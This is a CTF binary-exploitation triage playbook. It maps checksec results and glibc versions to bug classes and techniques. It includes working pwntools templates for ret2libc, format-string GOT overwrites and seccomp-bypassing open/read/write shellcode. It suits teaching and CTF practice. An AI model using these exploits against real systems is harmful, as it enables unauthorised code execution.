---
title: "Playbook - Binary Exploitation Triage"
category: pwn
subcategory: triage
type: playbook
tags: [pwn-triage, where-to-start, stuck, what-attack, checksec, buffer-overflow, rop, ret2libc, format-string, heap, tcache, uaf, one-gadget, got-overwrite, primitive, arbitrary-write, arbitrary-read, seccomp, libc, pwntools]
summary: "checksec -> bug class -> technique, plus the 'I have primitive X, now what' table for pwn."
when_to_use:
  - "You have an ELF and maybe a libc and do not know where to start"
  - "You found a crash but do not know which technique it enables"
  - "You have an arbitrary read/write and need to convert it to a shell"
related: [attack-surface-by-primitive, rev-triage, gdb-pwndbg-gef, one-gadget, ropgadget-ropper, pwntools]
---

## TL;DR - first 5 commands

```sh
# 1. protections. this decides the entire strategy.
checksec --file=./chal
# 2. what libc functions does it use? gets/system/printf/malloc tell you the bug class.
nm -D ./chal; objdump -d --no-show-raw-insn -M intel ./chal | grep -E 'call .*<(gets|read|strcpy|sprintf|printf|system|malloc|free)@'
# 3. is there a flag-reading function already? (ret2win)
nm ./chal | grep -iE 'win|flag|shell|backdoor|secret|admin'
# 4. strings: /bin/sh, flag.txt, a format string, a libc version banner
strings -a ./chal | grep -iE '/bin/sh|flag|%s|%p|%n|GLIBC|libc'
# 5. libc version if a libc is provided
./libc.so.6 2>/dev/null | head -2; strings libc.so.6 | grep -m1 'GNU C Library'
```

Set up the harness immediately:
```python
#!/usr/bin/env python3
from pwn import *
import sys

exe = context.binary = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False) if args.LIBC or True else None
context.terminal = ["tmux", "splitw", "-h"]

def start():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug([exe.path], gdbscript="b *main\nc")
    return process([exe.path])

io = start()
io.interactive()
```
Patch the binary to the provided libc so local == remote:
```sh
pwninit --bin ./chal --libc ./libc.so.6 --ld ./ld-linux-x86-64.so.2   # or:
patchelf --set-interpreter ./ld-2.31.so --set-rpath . ./chal
```

---

## Section 1 - checksec decides the strategy

```
RELRO      Stack     NX      PIE       Meaning
----------------------------------------------------------------------------
Partial    No canary NX on   No PIE    -> classic: overflow -> ROP to libc. GOT is writable.
Full       Canary    NX on   PIE       -> you need a leak first. No GOT overwrite.
No RELRO   ...       NX off  ...       -> shellcode on the stack is on the table.
```

| Protection | Value | Consequence |
|---|---|---|
| **NX** | disabled | you can jump to shellcode: put it on the stack/heap/bss and return to it |
| **NX** | enabled | you must ROP / ret2libc / mprotect+shellcode / SROP |
| **PIE** | disabled | all binary addresses are fixed; ret2win, GOT overwrite, ROP with binary gadgets all work immediately |
| **PIE** | enabled | you need a binary-address leak (any address from the image) before using any gadget |
| **Canary** | none | straight stack smash to saved RIP |
| **Canary** | present | you need to leak it (format string, partial overwrite, `%s` past the buffer), or overflow around it (index bug, pointer overwrite), or brute force it byte-by-byte in a forking server |
| **RELRO** | Partial/No | GOT is writable -> overwrite `free@got`/`printf@got`/`exit@got` with `system`/`one_gadget` |
| **RELRO** | Full | GOT is read-only -> target `__malloc_hook`/`__free_hook` (glibc <= 2.33), `exit_funcs`/`tls_dtor_list`, `stdout` FSOP, or just ROP |
| **Static** | yes | no libc leak needed; huge gadget pool; `syscall` gadgets exist -> `execve("/bin/sh",0,0)` |
| **Stripped** | yes | `main` is the first arg to `__libc_start_main`; find it in `_start` |
| **Fortify** (`_chk` symbols) | yes | `%n` in format strings is blocked; `strcpy_chk` bounds-checks |

glibc version matters more than anything else:
| glibc | Key facts |
|---|---|
| <= 2.26 | no tcache; fastbin dup, unsorted bin attack, house of * all classic |
| 2.26-2.28 | tcache introduced, **no** key/count checks -> tcache dup is trivial |
| 2.29-2.31 | tcache key added (double free detected), count checks; `__free_hook` still exists |
| 2.32-2.33 | safe-linking (fd pointers XOR-mangled with `addr >> 12`) |
| >= 2.34 | `__malloc_hook`/`__free_hook` **removed** -> use FSOP (`_IO_2_1_stdout_`), `exit` handlers, House of Apple/Cat/Banana |
| >= 2.35 | `stdout` FSOP + `_IO_wfile_jumps` is the standard target |

---

## Section 2 - find the bug class

| Observable | Bug | Go to |
|---|---|---|
| `gets(buf)`, `read(0, buf, BIG)`, `strcpy` into a fixed buffer, `scanf("%s")` | stack buffer overflow | section 3 |
| `printf(user_input)` - one argument only | format string | section 4 |
| An index into an array with no bounds check (or `int` vs `unsigned`) | OOB read/write | "arbitrary write" in section 6 |
| `malloc`/`free` menu with edit/show/delete | heap | section 5 |
| `free(p)` without `p = NULL` | use-after-free / double free | section 5 |
| `alloca(n)`, `char buf[n]` with user `n` | stack clash | overflow |
| `atoi`/`strtol` result used as a size | integer overflow -> undersized buffer | overflow |
| `memcpy(dst, src, len)` with signed `len` | negative size -> huge copy | overflow |
| `system`/`popen` with user-influenced string | command injection (yes, in pwn too) | done |
| `open("flag.txt")` behind a check | logic bug / file descriptor reuse | read the check |
| `seccomp` in strings, or `prctl` calls | sandboxed: `seccomp-tools dump ./chal` | section 7 |
| `fork()` in a loop, same addresses every child | byte-by-byte brute force of canary/addresses | overflow |
| `setvbuf`/`alarm` and a menu | standard heap or stack challenge | - |
| A `vsyscall`/`syscall; ret` gadget in a static binary | SROP / direct syscall ROP | section 3 |
| Windows PE + `strcpy` | classic SEH/stack overflow | `ctfbrain search windows-pwn` |
| A kernel module (`.ko`) + `init` ramdisk | kernel pwn | `ctfbrain search kernel-pwn` |

---

## Section 3 - stack overflow decision flow

```sh
# find the exact offset
cyclic 200                          # generate
cyclic -l 0x6161616161616166        # look up after the crash
# or, faster:
gdb ./chal -ex 'r < <(python3 -c "print(\"A\"*200)")' -ex 'i r rsp'
```

```
Do you have a canary?
 |-- No ->
 |     Is there a win()/flag function?              -> ret2win (mind the 16-byte stack alignment: add a bare `ret`)
 |     Is NX off?                                   -> jmp to shellcode (need a stack leak or `jmp rsp` gadget)
 |     Is the binary static?                        -> ROP to execve via syscall gadgets (ROPgadget --ropchain)
 |     Is PIE off and RELRO partial?                -> ret2plt puts+GOT leak -> ret2libc (2 stages)
 |     Is PIE on?                                   -> leak a binary address first (format string, uninitialised read, partial overwrite of 1-2 bytes)
 |     Is the overflow too small for a full chain?  -> ret2csu / stack pivot (`leave; ret` into a controlled buffer) / one_gadget
 |     No leak possible at all?                     -> ret2dlresolve, or SROP if you can set rax=15
 |-- Yes ->
       Can you leak it? (format string, %s over the buffer, off-by-one that prints)
       Can you avoid it? (write below it via an index bug, or overwrite a pointer used later)
       Does it fork per connection? (same canary) -> brute force 1 byte at a time, 8*256 tries
```

The standard two-stage ret2libc:
```python
from pwn import *
exe = context.binary = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
OFF = 72                                     # offset to saved RIP

r = ROP(exe)
pop_rdi = r.find_gadget(["pop rdi", "ret"])[0]
ret     = r.find_gadget(["ret"])[0]

io = process([exe.path])
# stage 1: leak puts@GOT, return into main
io.sendline(flat({OFF: [pop_rdi, exe.got["puts"], exe.plt["puts"], exe.sym["main"]]}))
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]
log.success(f"libc base {libc.address:#x}")

# stage 2: system("/bin/sh")
io.sendline(flat({OFF: [ret, pop_rdi, next(libc.search(b"/bin/sh\x00")), libc.sym["system"]]}))
io.interactive()
```
`ctfbrain search ret2libc rop ret2csu srop ret2dlresolve stack-pivot`

---

## Section 4 - format string

```sh
# find your argument index
python3 -c "print('|'.join('%%%d$p' % i for i in range(1,40)))"
```

| Goal | Payload |
|---|---|
| Leak stack | `%p %p %p` or `%N$p` |
| Leak an arbitrary address | `%N$s` with the address placed at arg N (put it in your own buffer) |
| Leak the canary | it is the 8-byte value ending in `00`, usually args 11-20 |
| Leak libc | `%N$p` that lands on a `__libc_start_main+X` return address |
| Leak PIE base | `%N$p` that lands on a binary address |
| Write | `%<n>c%<N>$n` (4 bytes), `%hn` (2 bytes), `%hhn` (1 byte, safest) |
| Write a full 8-byte pointer | three `%hn` writes, or six `%hhn` writes, ordered by increasing value |

```python
from pwn import *
# pwntools does the arithmetic for you:
payload = fmtstr_payload(6, {exe.got["exit"]: exe.sym["win"]}, write_size="short")
```
Gotchas: `%n` is disabled by FORTIFY (`__printf_chk`); direct parameter access (`%N$`) is disabled by FORTIFY too - then use sequential `%c` padding. Stack addresses shift between local and remote if `argv`/`envp` differ.

`ctfbrain search format-string fsb fmtstr-payload`

---

## Section 5 - heap decision flow

```sh
# in gdb with pwndbg/gef:
# heap, bins, vis, arena, tcache
```

```
Do you have use-after-free (show/edit after free)?
 |-- Yes: read a freed chunk -> leaks
 |     tcache fd            -> heap base (safe-linking: real = leak ^ (addr>>12))
 |     unsorted/small bin fd/bk -> libc (main_arena+88/96)
 |     then edit the freed chunk's fd -> tcache poisoning -> arbitrary allocation
 |-- No:
 |     Do you have a heap overflow?
 |        -> chunk header corruption: size field -> overlapping chunks, house of einherjar, off-by-one (poison null byte)
 |     Do you have a double free?
 |        -> glibc < 2.29: tcache dup; >= 2.29: bypass the key by cycling 7 chunks through tcache into fastbin, then fastbin dup
 |     Do you have arbitrary free?
 |        -> fake chunk on the stack/bss -> House of Spirit
 |     Do you control malloc size only?
 |        -> House of Force (glibc < 2.29, top chunk size overwrite) / largebin attack
```

| Leak you need | Source |
|---|---|
| Heap base | tcache/fastbin fd of a freed chunk |
| libc base | unsorted-bin fd/bk (`main_arena+88` on 64-bit) or a large-bin chunk |
| Stack address | `libc.sym["environ"]` read after you have libc |
| PIE base | a pointer to the binary stored in the heap (a vtable, a function pointer) |

| Write target (by glibc) | Version |
|---|---|
| `__free_hook` = `system`, then `free("/bin/sh")` | <= 2.33 |
| `__malloc_hook` = one_gadget | <= 2.33 |
| `_IO_2_1_stdout_` FSOP (`_IO_wfile_jumps`, House of Apple 2) | >= 2.34 |
| `__exit_funcs` / `tls_dtor_list` (needs PTR_MANGLE key from TLS) | any |
| GOT entry | Partial RELRO only |
| Return address on the stack (via `environ` leak) | any |

`ctfbrain search tcache-poisoning house-of-apple fastbin-dup unsorted-bin-leak safe-linking`

---

## Section 6 - "I have this primitive, what do I do with it?"

| Primitive | Immediate conversion | Final goal |
|---|---|---|
| **Leak only (one read of a known address)** | read `puts@GOT` -> libc base; read `__libc_start_main_ret` off the stack -> libc; read a heap pointer -> heap base | enables everything else |
| **Arbitrary read (address -> bytes)** | 1. libc base from GOT. 2. stack address from `libc.sym["environ"]`. 3. read the flag directly if it is in memory (`flag` in `.bss`, or already `read()` in) | often the flag IS in memory: search the heap for `flag{` |
| **Arbitrary write (1 write, 8 bytes)** | Partial RELRO: `free@GOT = system` then trigger `free(ptr_you_control)` with `"/bin/sh"`. Full RELRO: `__free_hook`(<=2.33) / `exit` handlers / stack return address (needs `environ` leak) | shell |
| **Arbitrary write (unlimited)** | write a full ROP chain over the saved return address (get the stack via `environ`) | shell |
| **Arbitrary write of 1 byte** | partial overwrite of a GOT entry or a return address (last 12 bits are ASLR-invariant -> 1/16 brute force) | control flow |
| **One free (arbitrary pointer)** | House of Spirit: craft a fake chunk in a buffer you control, free it, malloc it back -> arbitrary allocation | arbitrary write |
| **One malloc of a controlled address** | tcache poisoning result: allocate over `__free_hook`/stdout/a GOT entry, then write | arbitrary write |
| **Control of RIP, no chain space** | `one_gadget` (check its constraints with gdb at the crash), or stack pivot (`pop rsp`, `leave; ret`) to a bigger buffer | shell |
| **Control of RIP + rdi** | `system("/bin/sh")` | shell |
| **Control of RAX + a `syscall; ret`** | SROP: `rax=15`, `sigreturn`, full register control via a fake sigframe | shell |
| **Overflow smaller than 24 bytes** | `ret2csu` to set rdi/rsi/rdx, or overwrite only the saved RBP (`leave; ret` pivot), or partial RIP overwrite | chain |
| **Format string read** | leak canary, PIE, libc, stack in ONE payload | enables overflow |
| **Format string write** | GOT overwrite (Partial RELRO) or return-address overwrite | shell |
| **Write-what-where but value is constrained (e.g. only zeroes)** | null out a length check, a flag byte, a `is_admin` field, or the low byte of a size | logic bypass |
| **Off-by-one null byte (poison null byte)** | shrink a chunk's `prev_size`/`size` -> chunk overlap | heap control |
| **UAF read** | heap + libc leak | enables everything |
| **UAF write** | tcache poisoning -> arbitrary allocation | arbitrary write |
| **Integer overflow on a size** | undersized allocation + full-size write = heap overflow | heap control |
| **A `win()` function exists** | just return to it (align the stack with a bare `ret`) | flag |

`ctfbrain search attack-surface-by-primitive` for the web and crypto equivalents.

---

## Section 7 - seccomp sandbox

```sh
seccomp-tools dump ./chal
```
| Filter allows | Technique |
|---|---|
| `execve` blocked, `open/read/write` allowed | ORW shellcode: open("flag.txt"), read, write(1) |
| only `openat/read/write` | same, use `openat(AT_FDCWD, ...)` |
| `execveat` allowed but `execve` blocked | `execveat(fd, "", argv, envp, AT_EMPTY_PATH)` |
| `mmap`/`mprotect` allowed | write shellcode into an RWX page |
| 32-bit syscalls not filtered | `retfq` to 32-bit mode and use int 0x80 |
| `x32` ABI not filtered | syscall numbers OR-ed with `0x40000000` |
| Everything blocked but `write` | leak memory to yourself; the flag may already be loaded |

```python
shellcode = shellcraft.open("./flag.txt") + shellcraft.read("rax", "rsp", 100) + shellcraft.write(1, "rsp", 100)
payload = asm(shellcode)
```

---

## Section 8 - what to do when the exploit works locally but not remotely

1. Wrong libc: `pwninit`/`patchelf` against the provided libc; if none provided, identify it from a leak:
   ```sh
   # use the last 3 hex digits of a leaked symbol
   libc-database/find puts 5f0 printf 800
   ```
2. Environment differs: the stack shifts with `envp`. Avoid stack addresses; use relative offsets.
3. Buffering: add `io.recvuntil()` anchors, avoid `sleep`; remote is `PTY`-less so `setvbuf` behaves differently.
4. ASLR: locally disabled in gdb by default. Test with `setarch -R` off.
5. One-gadget constraints not met remotely: check `rsp+0x30 == NULL` style constraints with a different gadget.
6. Newline/whitespace: `scanf("%s")` stops on any whitespace; `read` does not. Your payload may contain `\x20`, `\x09`, `\x0a`.
7. Null bytes: `strcpy` stops at `\x00`; reorder the chain or use a different primitive.

`ctfbrain search stuck`
